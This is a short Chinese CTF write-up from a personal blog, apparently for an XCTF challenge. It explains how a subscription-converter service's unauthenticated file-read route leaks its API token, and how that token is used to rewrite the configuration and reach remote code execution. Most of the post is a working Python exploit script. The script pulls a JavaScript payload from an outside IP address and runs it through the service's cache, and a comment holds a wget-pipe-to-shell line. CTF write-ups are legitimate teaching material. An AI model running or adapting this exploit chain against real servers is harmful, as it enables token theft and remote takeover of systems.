<p>其实没搞懂和2022的题有什么区别。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710855715724-252d8dfd-6312-4ebb-b20d-1a490f1a4b28.png#averageHue=%2313161c&clientId=ud257d492-5fa8-4&from=paste&height=334&id=udf4d07c1&originHeight=668&originWidth=1778&originalType=binary&ratio=2&rotation=0&showTitle=false&size=140170&status=done&style=none&taskId=ua26f026d-279e-4bd2-aad3-28cb92e2ccb&title=&width=889" alt="image.png"><br>在源码中可以看到，当api-mode为false的时候，是会进入2个路由的，getlocal和get，这边直接开启文件读取了。所以很快就能定位api-token，拿到token后我们可以update conf更新配置文件去rce。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710855842772-7893f19c-d328-4a7f-bacf-2a2d0dc927d1.png#averageHue=%2312151b&clientId=ud257d492-5fa8-4&from=paste&height=595&id=u3ec4e6db&originHeight=1190&originWidth=1974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=247960&status=done&style=none&taskId=uf17f788f-57ac-4e5c-a486-96dd8b218b5&title=&width=987" alt="image.png"><br>这个路由需要token验证，高版本把enable-cache关了，这是之前的rce方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710856298852-c7bc042a-9f2a-4014-89b7-676a000e73e6.png#averageHue=%2314181d&clientId=ud257d492-5fa8-4&from=paste&height=544&id=ucdbab787&originHeight=1088&originWidth=1934&originalType=binary&ratio=2&rotation=0&showTitle=false&size=305339&status=done&style=none&taskId=ub64028ed-5ac2-4727-abc5-c8ce86be759&title=&width=967" alt="image.png"><br>cache会创建一个缓存文件，然后用script去运行js文件就可以rce。<br>高版本默认关闭了enable-cache，更新配置文件就解决了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">server_addr = <span class="string">&quot;http://127.0.0.1:25500&quot;</span></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"><span class="comment"># get token</span></span><br><span class="line"></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/getlocal?path=./pref.toml&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    token = re.findall(<span class="string">r&#x27;api_access_token = &quot;(.+)&quot;&#x27;</span>, resp.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    token = re.findall(<span class="string">r&#x27;api_access_token = &quot;(.+)&quot;&#x27;</span>,resp.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable_cache=true</span></span><br><span class="line"><span class="comment"># api_access_token=TOKEN</span></span><br><span class="line">conf_file=<span class="built_in">open</span>(<span class="string">&quot;conf_file.toml&quot;</span>).read().replace(<span class="string">&quot;TOKEN&quot;</span>, token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update conf</span></span><br><span class="line">resp = rs.post(server_addr + <span class="string">&quot;/updateconf&quot;</span>,params=&#123;<span class="string">&quot;token&quot;</span>:token,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;direct&quot;</span>&#125;,data=conf_file.encode())</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># host a file</span></span><br><span class="line"><span class="comment">#std.popen(&quot;sh -c &#x27;wget -O - xxxxx/s|sh&#x27;&quot;, &quot;r&quot;);</span></span><br><span class="line">node_addr = <span class="string">&#x27;http://8.130.24.188:8886/payload.js&#x27;</span></span><br><span class="line">file_path = <span class="string">&#x27;script:cache/&#x27;</span>+hashlib.md5(node_addr.encode()).hexdigest()</span><br><span class="line"><span class="comment"># fetch my js</span></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/sub&quot;</span>,params=&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;quanx&quot;</span>,<span class="string">&quot;url&quot;</span>:node_addr&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="comment"># run my js</span></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/sub&quot;</span>,params=&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;quanx&quot;</span>,<span class="string">&quot;url&quot;</span>:file_path&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710857568831-a54e44f2-8bfc-4a44-83e0-9e1cadf11de2.png#averageHue=%23272625&clientId=ud257d492-5fa8-4&from=paste&height=346&id=u9e3c2066&originHeight=692&originWidth=1160&originalType=binary&ratio=2&rotation=0&showTitle=false&size=116684&status=done&style=none&taskId=uee066d1d-0667-4e88-974e-230014df516&title=&width=580" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/XCTF/" class="tag">#XCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/03/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Exchange%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">春秋云镜 Exchange Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/03/19/%E6%98%A5%E7%A7%8B%E8%BF%90%E9%95%9C%20Hospital%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">春秋云镜 Hospital Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>